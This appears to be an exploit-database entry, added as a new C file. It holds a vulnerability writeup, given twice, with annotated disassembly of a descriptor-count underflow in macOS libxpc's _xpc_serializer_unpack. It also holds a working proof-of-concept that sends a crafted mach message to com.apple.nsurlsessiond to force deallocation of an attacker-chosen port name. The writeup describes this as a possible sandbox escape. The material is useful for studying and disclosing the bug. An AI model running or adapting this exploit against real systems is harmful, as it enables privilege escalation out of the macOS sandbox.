@@ -1,0 +1,287 @@
+/*
+_xpc_serializer_unpack in libxpc parses mach messages which contain xpc messages.
+
+There are two reasons for an xpc mach message to contain descriptors: if the message body is large, then it's sent as
+a MACH_MSG_OOL_DESCRIPTOR. Also if the message contains other port resources (eg memory entry ports) then
+they're also transfered as MACH_PORT_OOL_PORT descriptors.
+
+Whilst looking through a dump of system mach message traffic gathered via a dtrace script I noticed something odd:
+It's possible for a message to have the MACH_MSGH_BITS_COMPLEX bit set and also have a msgh_descriptor_count of 0.
+
+Looking at ipc_kmsg_copyin_body you can see that this is in fact the case.
+
+This is a kinda surprising fact, and I think there are likely to be multiple places where developers are going to
+have assumed that there must be at least one descriptor if MACH_MSGH_BITS_COMPLEX is set.
+
+It turns out that libxpc does exactly that in _xpc_serializer_unpack:
+
+__text:0000000000007016                 cmp     dword ptr [rbx], 0        ; rbx points to the start of the mach message
+__text:0000000000007019                 js      short loc_703F            ; branch if the COMPLEX bit is set
+...
+__text:000000000000703F loc_703F:                               ; CODE XREF: __xpc_serializer_unpack+67↑j
+__text:000000000000703F                 mov     rax, rbx
+__text:0000000000007042                 mov     edx, [rax+18h]            ; read msgh_descriptor_count, which could be 0
+__text:0000000000007045                 add     rbx, 1Ch                  ; point rbx to the first descriptor
+__text:0000000000007049                 mov     ecx, 0FF000000h
+__text:000000000000704E                 and     ecx, [rax+24h]
+__text:0000000000007051                 cmp     ecx, 1000000h             ; is the type OOL_DESC?
+__text:0000000000007057                 jnz     short loc_7089
+__text:0000000000007059                 or      byte ptr [r12+0ACh], 4    ; yes, then set this bit
+__text:0000000000007062                 mov     r9, [rbx]                 ; save the address field
+__text:0000000000007065                 mov     r15d, [rbx+0Ch]           ; and size field for later
+__text:0000000000007069                 lea     rax, __xpc_serializer_munmap
+__text:0000000000007070                 mov     [r12+48h], rax
+__text:0000000000007075                 dec     edx                       ; decrement msgh_descriptor_count, so could now be 0xffffffff
+__text:0000000000007077                 mov     dword ptr [rbx+0Ch], 0    ; clear the size in the message
+__text:000000000000707E                 lea     rbx, [rbx+10h]            ; skip over this desc
+__text:0000000000007082                 mov     eax, 2Ch ; ','
+__text:0000000000007087                 jmp     short loc_7094
+__text:0000000000007094                 test    edx, edx                  ; test whether msgh_descriptor_count is now 0
+__text:0000000000007096                 jz      loc_713E                  ; but we've decremented it to 0xffffffff :)
+
+The code the goes on to read up to 0xffffffff port descriptors, storing the names and dispositions in two arrays.
+
+By specifying an invalid disposition we can stop the loop, the serializer will then return an error and be destructed
+which will cause names read from our fake descriptors to be passed to mach_port_deallocate().
+
+You can test this PoC by attached lldb to the chosen target, setting a breakpoint on mach_port_deallocate and waiting
+for the port name 0x414141 to be passed in rsi.
+
+There is one mitigating factor which might prevent this from being exploitable on iOS: the underflowed value is used for two memory allocations
+so you need to be able to reserve around 32G of RAM, on MacOS this is no problem but doesn't seem to be so easy on my XS.
+
+Still, it would be a nice sandbox escape on MacOS.
+
+Tested on MacOS 10.14.1 (18B75)
+*/
+
+// ianbeer
+#if 0
+Arbitrary mach port name deallocation in XPC services due to invalid mach message parsing in _xpc_serializer_unpack
+
+_xpc_serializer_unpack in libxpc parses mach messages which contain xpc messages.
+
+There are two reasons for an xpc mach message to contain descriptors: if the message body is large, then it's sent as
+a MACH_MSG_OOL_DESCRIPTOR. Also if the message contains other port resources (eg memory entry ports) then
+they're also transfered as MACH_PORT_OOL_PORT descriptors.
+
+Whilst looking through a dump of system mach message traffic gathered via a dtrace script I noticed something odd:
+It's possible for a message to have the MACH_MSGH_BITS_COMPLEX bit set and also have a msgh_descriptor_count of 0.
+
+Looking at ipc_kmsg_copyin_body you can see that this is in fact the case.
+
+This is a kinda surprising fact, and I think there are likely to be multiple places where developers are going to
+have assumed that there must be at least one descriptor if MACH_MSGH_BITS_COMPLEX is set.
+
+It turns out that libxpc does exactly that in _xpc_serializer_unpack:
+
+__text:0000000000007016                 cmp     dword ptr [rbx], 0        ; rbx points to the start of the mach message
+__text:0000000000007019                 js      short loc_703F            ; branch if the COMPLEX bit is set
+...
+__text:000000000000703F loc_703F:                               ; CODE XREF: __xpc_serializer_unpack+67↑j
+__text:000000000000703F                 mov     rax, rbx
+__text:0000000000007042                 mov     edx, [rax+18h]            ; read msgh_descriptor_count, which could be 0
+__text:0000000000007045                 add     rbx, 1Ch                  ; point rbx to the first descriptor
+__text:0000000000007049                 mov     ecx, 0FF000000h
+__text:000000000000704E                 and     ecx, [rax+24h]
+__text:0000000000007051                 cmp     ecx, 1000000h             ; is the type OOL_DESC?
+__text:0000000000007057                 jnz     short loc_7089
+__text:0000000000007059                 or      byte ptr [r12+0ACh], 4    ; yes, then set this bit
+__text:0000000000007062                 mov     r9, [rbx]                 ; save the address field
+__text:0000000000007065                 mov     r15d, [rbx+0Ch]           ; and size field for later
+__text:0000000000007069                 lea     rax, __xpc_serializer_munmap
+__text:0000000000007070                 mov     [r12+48h], rax
+__text:0000000000007075                 dec     edx                       ; decrement msgh_descriptor_count, so could now be 0xffffffff
+__text:0000000000007077                 mov     dword ptr [rbx+0Ch], 0    ; clear the size in the message
+__text:000000000000707E                 lea     rbx, [rbx+10h]            ; skip over this desc
+__text:0000000000007082                 mov     eax, 2Ch ; ','
+__text:0000000000007087                 jmp     short loc_7094
+__text:0000000000007094                 test    edx, edx                  ; test whether msgh_descriptor_count is now 0
+__text:0000000000007096                 jz      loc_713E                  ; but we've decremented it to 0xffffffff :)
+
+The code the goes on to read up to 0xffffffff port descriptors, storing the names and dispositions in two arrays.
+
+By specifying an invalid disposition we can stop the loop, the serializer will then return an error and be destructed
+which will cause names read from our fake descriptors to be passed to mach_port_deallocate().
+
+You can test this PoC by attached lldb to the chosen target, setting a breakpoint on mach_port_deallocate and waiting
+for the port name 0x414141 to be passed in rsi.
+
+There is one mitigating factor which might prevent this from being exploitable on iOS: the underflowed value is used for two memory allocations
+so you need to be able to reserve around 32G of RAM, on MacOS this is no problem but doesn't seem to be so easy on my XS.
+
+Still, it would be a nice sandbox escape on MacOS.
+
+Tested on MacOS 10.14.1 (18B75)
+
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <mach/mach.h>
+
+kern_return_t
+bootstrap_look_up(mach_port_t bp, const char* service_name, mach_port_t *sp);
+
+struct xpc_w00t {
+  mach_msg_header_t hdr;
+  mach_msg_body_t body;
+  mach_msg_port_descriptor_t client_port;
+  mach_msg_port_descriptor_t reply_port;
+};
+
+static int
+xpc_checkin(
+  mach_port_t service_port,
+  mach_port_t* client_port,
+  mach_port_t* reply_port)
+{
+  // allocate the client and reply port:
+  kern_return_t err;
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, client_port);
+  if (err != KERN_SUCCESS) {
+    printf("port allocation failed: %s\n", mach_error_string(err));
+    exit(EXIT_FAILURE);
+  }
+
+  // insert a send so we maintain the ability to send to this port
+  err = mach_port_insert_right(mach_task_self(), *client_port, *client_port, MACH_MSG_TYPE_MAKE_SEND);
+  if (err != KERN_SUCCESS) {
+    printf("port right insertion failed: %s\n", mach_error_string(err));
+    exit(EXIT_FAILURE);
+  }
+
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, reply_port);
+  if (err != KERN_SUCCESS) {
+    printf("port allocation failed: %s\n", mach_error_string(err));
+    exit(EXIT_FAILURE);
+  }
+
+  struct xpc_w00t msg;
+  memset(&msg.hdr, 0, sizeof(msg));
+  msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+  msg.hdr.msgh_size = sizeof(msg);
+  msg.hdr.msgh_remote_port = service_port;
+  msg.hdr.msgh_id   = 'w00t';
+  
+  msg.body.msgh_descriptor_count = 2;
+
+  msg.client_port.name        = *client_port;
+  msg.client_port.disposition = MACH_MSG_TYPE_MOVE_RECEIVE; // we still keep the send
+  msg.client_port.type        = MACH_MSG_PORT_DESCRIPTOR;
+
+  msg.reply_port.name        = *reply_port;
+  msg.reply_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
+  msg.reply_port.type        = MACH_MSG_PORT_DESCRIPTOR;
+  
+  err = mach_msg(&msg.hdr,
+                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
+                 msg.hdr.msgh_size,
+                 0,
+                 MACH_PORT_NULL,
+                 MACH_MSG_TIMEOUT_NONE,
+                 MACH_PORT_NULL);
+  if (err != KERN_SUCCESS) {
+    printf("w00t message send failed: %s\n", mach_error_string(err));
+    exit(EXIT_FAILURE);
+  } else {
+    printf("sent xpc w00t message\n");
+  }
+
+  return 1;
+}
+
+struct xpc_bad_ool {
+  mach_msg_header_t hdr;
+  mach_msg_body_t body;
+  mach_msg_ool_descriptor_t ool0;
+  mach_msg_port_descriptor_t port1;
+  mach_msg_ool_descriptor_t ool2;
+};
+
+
+void bad_xpc(mach_port_t p) {
+  kern_return_t err;
+  struct xpc_bad_ool msg = {0};
+
+  msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+  msg.hdr.msgh_size = sizeof(msg);
+  msg.hdr.msgh_remote_port = p;
+  msg.hdr.msgh_id   = 0x10000000;
+  
+  msg.body.msgh_descriptor_count = 0;
+
+  msg.ool0.address = 0x414141414141;
+  msg.ool0.size = 0x4000;
+  msg.ool0.type = MACH_MSG_OOL_DESCRIPTOR;
+  
+  msg.port1.name = 0x41414141;  // port name to mach_port_deallocate in target
+  msg.port1.disposition = 0x11;
+  msg.port1.type = MACH_MSG_PORT_DESCRIPTOR;
+  
+  msg.ool2.address = 0x414141414141;
+  msg.ool2.size = 0x4000;
+  msg.ool2.type = MACH_MSG_OOL_DESCRIPTOR;
+  
+
+  err = mach_msg(&msg.hdr,
+                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
+                 msg.hdr.msgh_size,
+                 0,
+                 MACH_PORT_NULL,
+                 MACH_MSG_TIMEOUT_NONE,
+                 MACH_PORT_NULL);
+  if (err != KERN_SUCCESS) {
+    printf("xpc message send failed: %s\n", mach_error_string(err));
+    exit(EXIT_FAILURE);
+  } else {
+    printf("sent xpc message\n");
+  }
+
+}
+
+// lookup a launchd service:
+static mach_port_t
+lookup(
+  char* name)
+{
+  mach_port_t service_port = MACH_PORT_NULL;
+  kern_return_t err = bootstrap_look_up(bootstrap_port, name, &service_port);
+  if(err != KERN_SUCCESS){
+    printf("unable to look up %s\n", name);
+    return MACH_PORT_NULL;
+  }
+  
+  if (service_port == MACH_PORT_NULL) {
+    printf("bad service port\n");
+    return MACH_PORT_NULL;
+  }
+  return service_port;
+}
+
+void
+xpc_connect(
+  char* service_name,
+  mach_port_t* xpc_client_port,
+  mach_port_t* xpc_reply_port)
+{
+  mach_port_t service_port = lookup(service_name);
+  xpc_checkin(service_port, xpc_client_port, xpc_reply_port);
+  mach_port_destroy(mach_task_self(), service_port);
+}
+
+int main() {
+  mach_port_t service_port = lookup("com.apple.nsurlsessiond");
+
+  mach_port_t xpc_client_port = MACH_PORT_NULL;
+  mach_port_t xpc_reply_port  = MACH_PORT_NULL;
+
+  xpc_checkin(service_port, &xpc_client_port, &xpc_reply_port);
+  printf("xpc_client_port: %x\n", xpc_client_port);
+  printf("checked in?\n");
+
+  bad_xpc(xpc_client_port);
+
+  return 0;
+}
